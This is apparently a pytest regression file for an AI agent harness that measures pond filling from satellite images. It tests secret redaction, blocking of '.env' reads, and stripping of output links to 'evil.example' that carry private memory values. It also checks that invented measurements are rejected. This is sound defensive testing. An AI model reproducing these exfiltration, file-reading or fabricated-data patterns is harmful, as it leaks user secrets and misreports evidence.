"""Regression tests for the A3 review findings (harness guarantees, injection, streaming,
contract, cost and quality). Offline: EARTH_IMPL=stub, FakeProvider, no real API."""

# The `client` fixture is imported from the loop tests, so test arguments shadow it.
# ruff: noqa: F811

from __future__ import annotations

import asyncio
import importlib
import json
import re
from collections.abc import Iterator
from datetime import date
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient
from pydantic import BaseModel

import earth
from app.core.config import settings
from app.schemas.runs import RunRecord
from app.schemas.stream import BlockReady, ClarificationNeeded, ClarificationQuestion
from app.services import sandbox
from app.services.agent import answer as answers
from app.services.agent import loop, policy, prompts, scoring, tools
from app.services.agent.harness import Limits, ask_refusal
from app.services.agent.llm.base import Turn
from app.services.agent.llm.fake import tool_turn
from app.services.agent.scoring import score
from app.services.agent.script_check import scan_agent_script
from app.services.agent.state import AgentState, ScriptRun
from app.services.agent.validate import (
    REDACTED,
    FinishArgs,
    check_numbers,
    extract_numbers,
    number_sources,
    redact_secrets,
    validate_finish,
)
from earth.blocks import (
    Image,
    LimitAction,
    LimitsBlock,
    ThenNowBlock,
    TimelineBlock,
    TimelineMark,
    TimelinePoint,
)
from earth.presets import HOO_HOK_WAI
from knowledge import KnowledgeBase, load_knowledge
from tests.agent_helpers import (
    AREA,
    PLACE,
    POND_RUN,
    REGISTER,
    USAGE,
    USER,
    agent_client,
    answer_of,
    assert_closed,
    explain,
    finish,
    first,
    get_run,
    names,
    pin,
    results_of,
    sse,
    start,
)
from tests.test_agent_tools import (
    body,
    call,
    make_ctx,
    register,
    run,
    run_code,
)
from tests.test_agent_validate import _args, _score, _state

#: Hand-typed "measurements" from a script that reads no data at all.
TYPED_SCRIPT = """
def run(**params):
    observed = {
        "water": {"value": -0.3, "before": 0.3, "after": -0.3, "delta": -0.6,
                  "inside_band": False, "local": True, "persistent": True, "sudden": True,
                  "date": "2026-03-01"},
        "roughness": {"value": -10.0, "before": -20.0, "after": -10.0, "delta": 10.0,
                      "inside_band": False, "local": True, "persistent": True,
                      "sudden": None, "date": None},
        "moisture": {"value": -0.2, "before": 0.1, "after": -0.2, "delta": -0.3,
                     "inside_band": False, "local": True, "persistent": None,
                     "sudden": None, "date": None},
    }
    return {"findings": {"observed": observed, "filled_ha": 47.3}, "evidence": [],
            "blocks": [], "notes": ["About 47.3 ha filled."]}
"""

FAKE_KEY = "sk-ant-api03-FAKEKEYFORTESTS0123456789abcdef"

#: Builds a key-shaped string at run time (as text read from a file would arrive).
LEAKY_SCRIPT = """
import earth


def run(**params):
    earth.scenes(earth.Area.from_geojson(params["area"]))
    key = "sk-" + "ant-api03-FAKEKEYFORTESTS0123456789abcdef"
    return {"findings": {"observed": {}, "token": key}, "evidence": [],
            "blocks": [], "notes": ["key " + key]}
"""

MANY_BLOCKS_SCRIPT = """
import earth


def run(**params):
    earth.scenes(earth.Area.from_geojson(params["area"]))
    blocks = [earth.show.stat("Value", float(i), "ha", id="s" + str(i)) for i in range(20)]
    big = {"rows": ["x" * 100 for _ in range(400)]}
    return {"findings": {"observed": {}, "dump": big}, "evidence": [big, {"ok": 1}],
            "blocks": blocks, "notes": []}
"""

#: The pond skill's stub readings (EARTH_IMPL=stub), as `adapt_findings` returns them.
STUB_SKILL_OBSERVED: dict[str, Any] = {
    "greenness": {"before": 0.436, "after": 0.055, "delta": -0.381, "inside_band": False,
                  "local": True, "date": "2025-08-14"},
    "moisture": {"before": 0.256, "after": -0.05, "delta": -0.306},
    "water": {"before": 0.106, "after": -0.25, "delta": -0.356, "inside_band": False,
              "local": True, "persistent": True, "date": "2025-09-14"},
    "bare": {"before": -0.344, "after": 0.12, "delta": 0.464, "inside_band": False,
             "local": True, "date": "2025-09-14"},
}  # fmt: skip


@pytest.fixture(scope="module")
def kb() -> KnowledgeBase:
    return load_knowledge()


@pytest.fixture(autouse=True)
def stub_earth(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[Path]:
    monkeypatch.setenv("EARTH_IMPL", "stub")
    monkeypatch.setenv("EARTH_DATA_DIR", str(tmp_path))
    yield tmp_path


@pytest.fixture
def client(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Iterator[TestClient]:
    with agent_client(tmp_path, monkeypatch) as c:
        yield c


def _pond_state(kb: KnowledgeBase, observed: dict[str, Any], *ids: str) -> AgentState:
    from app.services.agent.harness import register_hypotheses

    st = AgentState(provider="fake", model="fake-1")
    register_hypotheses(st, kb, list(ids) or ["pond_filling"])
    st.scripts.append(ScriptRun(index=1, kind="skill", skill_id="pond-filling-check", ok=True))
    st.findings = {"observed": observed}
    return st


# --- harness-guarantees -------------------------------------------------------------------------


def test_script_that_read_no_data_cannot_score_or_supply_numbers(kb: KnowledgeBase) -> None:
    ctx = make_ctx(kb)
    run(call("read_card", card_id="pond_filling"), ctx)
    register(ctx, "pond_filling")
    out = run_code(ctx, TYPED_SCRIPT)
    data = body(out)
    assert "ignored" in data and data["observed"] == {}
    assert not any(isinstance(e, BlockReady) for e in out.events)
    assert ctx.state.findings.get("observed", {}) == {} and ctx.state.notes == []
    assert data["scoring"].get("top") is None  # compact JSON drops null values
    cause = finish_call(
        title="The pond no longer shows open water",
        sentence="About 47.3 ha of pond no longer shows open water.",
        cause_card_id="pond_filling",
        cause="consistent with filling",
        caveats=["Images cannot show who did it."],
        measure_only=False,
    )
    problems = json.loads(run(cause, ctx).result.content)["problems"]
    assert any("not supported" in p or "not rated" in p for p in problems)
    assert any("'47.3'" in p for p in problems)


def finish_call(**kw: Any) -> Any:
    args: dict[str, Any] = {
        "title": "t",
        "sentence": "s",
        "cause_card_id": None,
        "cause": None,
        "todo": None,
        "stats": [],
        "caveats": [],
        "primary_block_id": None,
        "followups": [],
        "measure_only": True,
    }
    args.update(kw)
    return call("finish", **args)


@pytest.mark.parametrize(
    ("title", "sentence"),
    [
        ("Pond filled in with earth for a building site", "The water index fell."),
        ("The pond no longer shows open water", "The pond was filled in with soil and rubble."),
        ("Pond or wetland filling at the ponds", "The water index fell."),
    ],
)
def test_measure_only_answer_states_no_cause(kb: KnowledgeBase, title: str, sentence: str) -> None:
    args = _args(title=title, sentence=sentence, cause_card_id=None, cause=None, measure_only=True)
    problems = validate_finish(args, _state(), kb, _score({"pond_filling": "unclear"}))
    assert any("names a cause" in p for p in problems), problems


@pytest.mark.parametrize(
    "sentence",
    [
        "Can't tell whether the ponds were filled in from these images.",
        "No clear sign these fish ponds were filled in.",
        "The water index fell from 0.12 to -0.25.",
        "The water index fell outside its normal seasonal range; fire and burn readings held.",
    ],
)
def test_measure_only_hedges_are_allowed(kb: KnowledgeBase, sentence: str) -> None:
    args = _args(sentence=sentence, cause_card_id=None, cause=None, measure_only=True)
    assert validate_finish(args, _state(), kb, _score({"pond_filling": "unclear"})) == []


def test_no_data_place_answer_may_not_say_what_happened(kb: KnowledgeBase) -> None:
    state = _state(scripts=[], findings={}, evidence=[], notes=[], blocks=[])
    base = {"cause_card_id": None, "cause": None, "stats": [], "caveats": []}
    told = _args(
        title="Your pond was filled in with soil",
        sentence="The pond at this place was filled in with soil and rubble.",
        primary_block_id=None,
        **base,
    )
    assert any("no data was read" in p for p in validate_finish(told, state, kb, None))
    general = _args(
        title="How filling shows from space",
        sentence="When a pond is filled in, the water reading drops and stays low.",
        primary_block_id=None,
        **base,
    )
    assert validate_finish(general, state, kb, None) == []


def test_named_cause_must_match_its_card(kb: KnowledgeBase) -> None:
    other = _args(cause="consistent with a new road being built across the pond")
    problems = validate_finish(other, _state(), kb, _score())
    assert any("construction" in p for p in problems), problems
    vague = _args(cause="something happened here")
    assert any("wording" in p for p in validate_finish(vague, _state(), kb, _score()))
    assert validate_finish(_args(), _state(), kb, _score()) == []


@pytest.mark.parametrize(
    "sentence",
    [
        "About 36.9 ha of ponds changed.",  # a number quoted in the card's news case
        "The ponds sit at 22.5 degrees north.",  # a case latitude
        "About 114.1 ha changed.",  # a case longitude
    ],
)
def test_card_cases_are_not_number_sources(kb: KnowledgeBase, sentence: str) -> None:
    problems = validate_finish(_args(sentence=sentence), _state(), kb, _score())
    assert any("does not come from the run" in p for p in problems), problems


def test_card_thresholds_still_count(kb: KnowledgeBase) -> None:
    pool = number_sources(_state(), kb)
    assert -0.05 in pool and 0.2 in pool  # pond_filling sign threshold and by_more_than
    assert not check_numbers([("caveats[0]", "moisture below -0.05")], pool)


@pytest.mark.parametrize(
    ("text", "needle"),
    [
        ("Of the ponds, 37 may have been filled.", "'37'"),
        ("About 1,950 square metres of pond became land.", "'1,950'"),
        ("About 1950 square metres of pond became land.", "'1950'"),
        ("Roughly forty-seven hectares lost their water.", "forty"),
        ("About 4,6 ha of pond became land.", "decimal comma"),
    ],
)
def test_number_tricks_are_rejected(text: str, needle: str) -> None:
    problems = check_numbers([("sentence", text)], [0.12])
    assert any(needle in p for p in problems), problems


def test_dates_and_years_stay_free() -> None:
    for text in ("Since 12 May 2024 and 3rd of May.", "In 2023 the water fell.", "on 5 May."):
        assert check_numbers([("sentence", text)], []) == [], text
    assert [c.value for c in extract_numbers("37 may have been filled")] == [37.0]


# --- security-injection -------------------------------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        'earth.Area.parse_file(".env")',
        "earth.Area.model_construct()",
        "err.doc",
        "err.args",
        "x.read_text()",
    ],
)
def test_agent_scan_bans_file_readers_and_raw_input(line: str) -> None:
    script = f"import earth\n\n\ndef run(**params):\n    return {line}\n"
    assert scan_agent_script(script) is not None


def test_run_code_refuses_parse_file_before_running(kb: KnowledgeBase) -> None:
    ctx = make_ctx(kb)
    register(ctx, "pond_filling")
    script = (
        "import earth\n\n\ndef run(**params):\n    try:\n"
        '        earth.Area.parse_file(".env")\n    except Exception as e:\n'
        '        return {"findings": {"x": e.doc}, "evidence": [], "blocks": []}\n'
    )
    out = run_code(ctx, script)
    assert out.result.is_error and "parse_file" in out.result.content
    assert out.events == [] and ctx.state.code_runs == 0


def test_script_output_is_redacted(kb: KnowledgeBase, monkeypatch: pytest.MonkeyPatch) -> None:
    ctx = make_ctx(kb)
    register(ctx, "pond_filling")
    out = run_code(ctx, LEAKY_SCRIPT)
    assert FAKE_KEY not in out.result.content and REDACTED in out.result.content
    assert FAKE_KEY not in json.dumps(ctx.state.dump())
    assert redact_secrets(f"x {FAKE_KEY} y") == f"x {REDACTED} y"
    from pydantic import SecretStr

    monkeypatch.setattr(settings, "anthropic_api_key", SecretStr("plain-configured-key-1234"))
    assert REDACTED in redact_secrets("value plain-configured-key-1234")


def _image(url: str, label: str = "12 Mar 2026") -> Image:
    return Image(
        layer_id="l1",
        url=url,
        bounds=(114.0, 22.4, 114.1, 22.5),
        date=date(2026, 3, 12),
        scene="S2A_TEST",
        label=label,
    )


def test_every_block_text_is_checked(kb: KnowledgeBase) -> None:
    secret = "Uncle Wong fish pond lease"
    ctx = make_ctx(kb, state=AgentState(provider="f", model="f", memory_values=[secret]))
    good = f"/api/layers/{ctx.run_id}/water/S2A_TEST.png"
    evil = ThenNowBlock(
        id="t1",
        title="Then and now",
        measure="water",
        before=_image(good),
        after=_image(f"https://evil.example/p.png?d={secret}"),
    )
    assert tools._clean_block(evil, ctx)[0] is None  # an image that is not this run's layer
    mem = ThenNowBlock(
        id="t2",
        title="Then and now",
        measure="water",
        before=_image(good, secret),
        after=_image(good),
    )
    cleaned, fixed = tools._clean_block(mem, ctx)
    assert (
        cleaned is not None
        and fixed == ["before.label"]
        and secret not in cleaned.model_dump_json()
    )
    point = TimelinePoint(date=date(2026, 1, 1), value=0.1, scene="S2A", clean_px=100)
    timeline = TimelineBlock(
        id="tl", title="Over time", measure="water", data=[point],
        marks=[TimelineMark(date=date(2026, 1, 1), label=f"lease: {secret}")],
    )  # fmt: skip
    cleaned, fixed = tools._clean_block(timeline, ctx)
    assert cleaned is not None and fixed == ["marks[0].label"]
    limits = LimitsBlock(
        id="lm", title="What I can't tell", cant_tell="Who did it.",
        actions=[LimitAction(label="See www.evil.example", kind="other")],
        contacts=["Planning Department", "mail https://evil.example"],
    )  # fmt: skip
    cleaned, _ = tools._clean_block(limits, ctx)
    assert cleaned is not None and cleaned.contacts == ["Planning Department"]
    assert cleaned.actions[0].label == ""


def test_blocks_evidence_and_findings_are_capped(kb: KnowledgeBase) -> None:
    ctx = make_ctx(kb)
    register(ctx, "pond_filling")
    out = run_code(ctx, MANY_BLOCKS_SCRIPT)
    data = body(out)
    kept = [e for e in out.events if isinstance(e, BlockReady)]
    assert len(kept) == tools.MAX_BLOCKS_PER_SCRIPT
    assert data["not_kept"]["blocks_not_kept"] == 20 - tools.MAX_BLOCKS_PER_SCRIPT
    assert data["not_kept"]["evidence_items_too_big"] == 1 and ctx.state.evidence == [{"ok": 1}]
    assert "dump" not in ctx.state.findings
    for _ in range(2):
        run_code(ctx, MANY_BLOCKS_SCRIPT)
    assert len(ctx.blocks) == tools.MAX_BLOCKS_PER_RUN


def test_expectations_are_short_safe_patterns(kb: KnowledgeBase) -> None:
    secret = "Uncle Wong fish pond lease"
    ctx = make_ctx(kb, state=AgentState(provider="f", model="f", memory_values=[secret]))
    table = [
        {
            "hypothesis": "pond_filling",
            "expected": [
                {"measure": "rain_mm", "expect": f"see https://evil.example {secret}"},
                {"measure": "heat", "expect": "dumped illegally by the tenant"},
                {"measure": "elevation_m", "expect": "up by > 1, sudden"},
            ],
        }
    ]
    out = run(
        call("register_hypotheses", hypotheses=["pond_filling"], expectation_table=table), ctx
    )
    assert not out.result.is_error
    [event] = [e for e in out.events if e.event == "hypotheses_registered"]
    row = event.expectation_table[0].expected
    assert "rain_mm" not in row and "heat" not in row and row["elevation_m"] == "up by > 1, sudden"
    assert len(body(out)["dropped_expectations"]["rows"]) == 2


def test_typed_answers_become_private() -> None:
    card = ClarificationNeeded(
        questions=[ClarificationQuestion(key="use", label="Use?", options=["Fish", "Birds"])]
    )
    got = loop.answer_values({"use": "leased to Mr Chan", "other": "fish "}, card)
    assert got == ["leased to Mr Chan"]  # an offered option is the model's own word


def test_reply_values_are_checked_as_memory(client: TestClient) -> None:
    typed = "leased to Mr Chan"
    ask = ("ask_user", {"questions": [{"key": "use", "label": "Use?", "options": ["A", "B"]}]})
    leaky = explain(sentence=f"Greenness matters even when {typed}.")
    provider = pin([tool_turn(ask), tool_turn(leaky), tool_turn(explain())])
    evs = start(client, question="What is greenness?")
    run_id = first(evs, "run_started")["run_id"]
    res = client.post(
        f"/api/runs/{run_id}/reply",
        json={"answers": {"use": typed}, "remember": False},
        headers={"X-User-Id": USER},
    )
    more = sse(res.text)
    assert_closed(more, "done")
    [rejected] = results_of(provider.calls[-1].messages[-1])
    assert rejected["error"] and any("private place memory" in p for p in rejected["problems"])


def test_too_many_running_agents_is_429(client: TestClient, monkeypatch) -> None:
    monkeypatch.setattr(policy.RUN_SLOTS, "limit", 0)
    pin([tool_turn(explain())])
    res = client.post(
        "/api/runs", json={"question": "What is greenness?"}, headers={"X-User-Id": USER}
    )
    assert res.status_code == 429 and int(res.headers["Retry-After"]) >= 1
    assert policy.RUN_SLOTS.active == 0


def test_spend_cap_is_checked_before_every_turn(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    real = policy.check_spend_cap
    seen = {"n": 0}

    def cap(now: Any = None) -> float:
        seen["n"] += 1
        if seen["n"] >= 3:  # the route's check, turn 1, then turn 2 hits the cap
            raise policy.SpendCapReached(spent_usd=21.0, cap_usd=20.0)
        return real(now)

    monkeypatch.setattr(policy, "check_spend_cap", cap)
    provider = pin([tool_turn(("read_card", {"card_id": "pond_filling"})), tool_turn(explain())])
    evs = start(client, area=AREA)
    assert_closed(evs, "done")
    answer = answer_of(evs)
    assert answer.measure_only and answers.TEMPLATE_REASONS["budget"] in answer.caveats
    assert provider.remaining == (1, 0)


def test_reply_after_the_spend_cap_is_503(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    ask = ("ask_user", {"questions": [{"key": "use", "label": "Use?", "options": ["A", "B"]}]})
    pin([tool_turn(ask)])
    evs = start(client, question="What is greenness?")
    run_id = first(evs, "run_started")["run_id"]
    monkeypatch.setattr(settings, "daily_spend_cap_usd", 0.0)
    res = client.post(
        f"/api/runs/{run_id}/reply", json={"answers": {"use": "A"}}, headers={"X-User-Id": USER}
    )
    assert res.status_code == 503
    assert get_run(client, run_id)["status"] == "waiting_user"


# --- streaming-persistence ----------------------------------------------------------------------


def test_method_and_script_are_stored_on_the_record(client: TestClient) -> None:
    pin(
        [
            tool_turn(("read_card", {"card_id": "pond_filling"})),
            tool_turn(REGISTER, POND_RUN),
            tool_turn(
                finish(
                    cause_card_id="pond_filling",
                    cause="consistent with filling",
                    primary_block_id="b1",
                    measure_only=False,
                )
            ),
        ]
    )
    evs = start(client, area=AREA)
    assert_closed(evs, "done")
    stored = get_run(client, first(evs, "run_started")["run_id"])
    method = stored["method"]
    assert {c["id"] for c in method["cards"]} >= {"pond_filling", "seasonal"}
    assert method["code_ref"] and method["model"] == "fake-1"
    assert stored["script"] and "def run" in stored["script"]
    params = stored["params"]
    assert params["script_params"]["area"] == AREA["geojson"]
    assert params["script_params"]["name"] and params["script_block_ids"] == ["b1"]
    assert "agent" not in params


def test_guard_time_does_not_count_against_the_agent(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(settings, "agent_wall_clock_s", 1.0)
    real = loop._guard

    async def slow(*args: Any, **kw: Any) -> Any:
        await asyncio.sleep(1.2)
        return await real(*args, **kw)

    monkeypatch.setattr(loop, "_guard", slow)
    pin([tool_turn(explain())])
    evs = start(client, question="What is greenness?")
    assert_closed(evs, "done")
    assert answer_of(evs).kind == "general"  # not the "ran out of time" template


def test_guard_call_has_a_time_limit(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    async def stuck(*args: Any, **kw: Any) -> Any:
        await asyncio.sleep(5)

    monkeypatch.setattr(loop, "_guard", stuck)
    monkeypatch.setattr(loop, "GUARD_TIMEOUT_S", 0.1)
    pin([tool_turn(explain())])
    evs = start(client, question="What is greenness?")
    assert names(evs) == ["run_started", "error", "done"]
    assert first(evs, "error")["kind"] == "llm_unavailable"


def test_no_question_on_the_last_turn(client: TestClient, monkeypatch) -> None:
    monkeypatch.setattr(settings, "agent_max_turns", 2)
    ask = ("ask_user", {"questions": [{"key": "use", "label": "Use?", "options": ["A", "B"]}]})
    pin([tool_turn(("read_card", {"card_id": "pond_filling"})), tool_turn(ask)])
    evs = start(client, area=AREA)
    assert "clarification_needed" not in names(evs)
    assert_closed(evs, "done")
    st = AgentState(provider="f", model="f", turns=2)
    assert "No turn is left" in (ask_refusal(st, Limits(max_turns=2)) or "")


# --- contract-compat ----------------------------------------------------------------------------


class PlaceDto(BaseModel):
    """The places service's record shape (app/schemas/places.py on main)."""

    id: str
    name: str
    geometry: dict
    area_ha: float


def _places_module(monkeypatch: pytest.MonkeyPatch, geometry: dict, name: str) -> None:
    class Places:
        @staticmethod
        def get_place(user_id: str, place_id: str) -> PlaceDto:
            return PlaceDto(id=place_id, name=name, geometry=geometry, area_ha=1.0)

    real = importlib.import_module

    def fake_import(mod: str, *args: Any, **kw: Any) -> Any:
        return Places if mod == loop.PLACES_MODULE else real(mod, *args, **kw)

    monkeypatch.setattr(loop.importlib, "import_module", fake_import)
    # Since #36 the route resolves `place_id` through the real places service first.
    from app.services import places as places_service

    monkeypatch.setattr(places_service, "get_place", Places.get_place)


def test_lookup_place_reads_the_place_record(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _places_module(monkeypatch, HOO_HOK_WAI.geojson, "Saved ponds")
    area = loop.lookup_place(USER, PLACE)
    assert area is not None and area.name == "Saved ponds"
    assert area.area_ha == pytest.approx(HOO_HOK_WAI.area_ha)
    pin([tool_turn(explain())])
    evs = start(client, place_id=PLACE)
    steps = [d["title"] for n, d in evs if n == "step_started"]
    assert steps[0] == "Look up the place"
    assert get_run(client, first(evs, "run_started")["run_id"])["area"] is not None


LANTAU = earth.Area.from_point(22.26, 113.95, radius_m=300).geojson


def test_no_agent_never_serves_the_preset_for_another_place(
    client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(settings, "daily_spend_cap_usd", 0.0)
    _places_module(monkeypatch, LANTAU, "Lantau slope")
    pin([tool_turn(explain())])
    for body_ in ({"place_id": "p_lantau"}, {"area": {"geojson": LANTAU, "name": "Lantau"}}):
        evs = start(client, question="What changed here?", **body_)
        assert names(evs) == ["run_started", "error", "done"], names(evs)
        assert first(evs, "error")["kind"] == "spend_cap"
        assert_closed(evs, "failed")
    monkeypatch.setattr(settings, "agent_mode", "preset")
    evs = start(client, question="What changed here?", place_id="p_lantau")
    assert first(evs, "error")["kind"] == "agent_unavailable"
    assert answer_of(start(client)).preset is True  # no place: the demo preset is fine


def test_model_refusal_mid_run_sends_a_guard_event(client: TestClient) -> None:
    pin([Turn(stop="refusal", refusal_category="cyber", usage=USAGE)])
    evs = start(client, area=AREA)
    assert names(evs)[-3:] == ["guard", "block_ready", "done"]
    guards = [d for n, d in evs if n == "guard"]
    assert guards[0]["scope"] == "answerable" and guards[-1]["scope"] == "not_allowed"
    assert_closed(evs, "refused")


@pytest.mark.parametrize(("n", "ok"), [(0, False), (1, False), (2, True), (5, True), (6, False)])
def test_ask_user_needs_two_to_five_options(n: int, ok: bool) -> None:
    q = [{"key": "use", "label": "Use?", "options": [f"o{i}" for i in range(n)]}]
    _, problems = tools._questions(q, Limits())
    assert (problems == []) is ok


# --- cost-quality -------------------------------------------------------------------------------


def test_pond_skill_readings_name_pond_filling(kb: KnowledgeBase) -> None:
    result = score(_pond_state(kb, STUB_SKILL_OBSERVED), kb)
    assert result.top == "pond_filling" and result.cannot_distinguish is None
    dry = {**STUB_SKILL_OBSERVED, "water": {**STUB_SKILL_OBSERVED["water"], "before": -0.2}}
    assert score(_pond_state(kb, dry), kb).top != "pond_filling"


def test_skill_gets_its_own_timeout(kb: KnowledgeBase, monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[int] = []

    async def fake_run(script: str, params: dict, run_id: str, on_call: Any, timeout_s: int):
        seen.append(timeout_s)
        return sandbox.RunOutcome(ok=False, result=None, error=None, calls=[])

    monkeypatch.setattr(sandbox, "run_script", fake_run)
    ctx = make_ctx(kb)
    register(ctx, "pond_filling")
    run(call("run_skill", skill_id="pond-filling-check", params_json="{}"), ctx)
    run_code(ctx, "def run(**params):\n    return {}\n")
    assert seen == [120, 60]


def test_partial_relook_keeps_the_skill_flags() -> None:
    st = AgentState(provider="f", model="f")
    st.merge_findings({"observed": {"water": STUB_SKILL_OBSERVED["water"]}})
    changed = st.merge_findings(
        {"observed": {"water": {"value": -0.25, "before": 0.088, "after": -0.1, "local": None}}}
    )
    water = st.findings["observed"]["water"]
    assert water["local"] is True and water["date"] == "2025-09-14"
    assert water["before"] == 0.088 and water["delta"] is None  # the change fields move together
    assert "water.before 0.106 -> 0.088" in changed


def test_measure_only_confidence_follows_scoring(
    kb: KnowledgeBase, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(scoring, "TIE_RULES", {})  # the tie the stub runs had before the fix
    st = _pond_state(kb, STUB_SKILL_OBSERVED)
    result = score(st, kb)
    assert result.cannot_distinguish is not None
    record = RunRecord(run_id="r_x", thread_id="t_x", user_id="u_x", question="q", status="running")
    f = FinishArgs(title="t", sentence="s", caveats=["c"], measure_only=True)
    answer = answers.build_answer(f, st, result, kb, record)
    assert answer.confidence.level == "Low" and answer.confidence.pct <= result.confidence.pct
    added = [c for c in answer.caveats if c != "c"]
    assert not any("no knowledge card fits" in c for c in added)
    for c in added:
        assert not re.search(r"\b[A-Z]{3,4}I\b|_", c), c


def test_earth_reference_explains_the_circle_fallback() -> None:
    ref = prompts.earth_reference()
    assert "CIRCLE" in ref and "25 km²" in ref


# --- The supported card's own wording is never another card's claim -------------------------


_BARE_TITLE = "Large shift from plants and water to bare or built ground across most of the site"


def _bare_run(**kw: Any) -> tuple[dict[str, Any], AgentState, Any]:
    args = _args(
        title=_BARE_TITLE,
        sentence=(
            "Most of the site changed from plants and water to ground consistent with new bare "
            "ground or a built surface."
        ),
        cause_card_id="new_bare_or_built",
        cause="consistent with new bare ground or a built surface",
        **kw,
    )
    state = _state(
        hypotheses=["new_bare_or_built", "construction"], cards_read=["new_bare_or_built"]
    )
    return args, state, _score({"new_bare_or_built": "supported", "construction": "unclear"})


def test_supported_card_wording_is_not_flagged_as_another_cause(kb: KnowledgeBase) -> None:
    args, state, scored = _bare_run()
    problems = validate_finish(args, state, kb, scored)
    assert not any("construction" in p or "wording" in p for p in problems), problems


def test_other_card_words_outside_own_wording_are_still_flagged(kb: KnowledgeBase) -> None:
    args, state, scored = _bare_run()
    args["cause"] = "consistent with new bare ground or a built surface, a construction site"
    problems = validate_finish(args, state, kb, scored)
    assert any("construction" in p for p in problems), problems
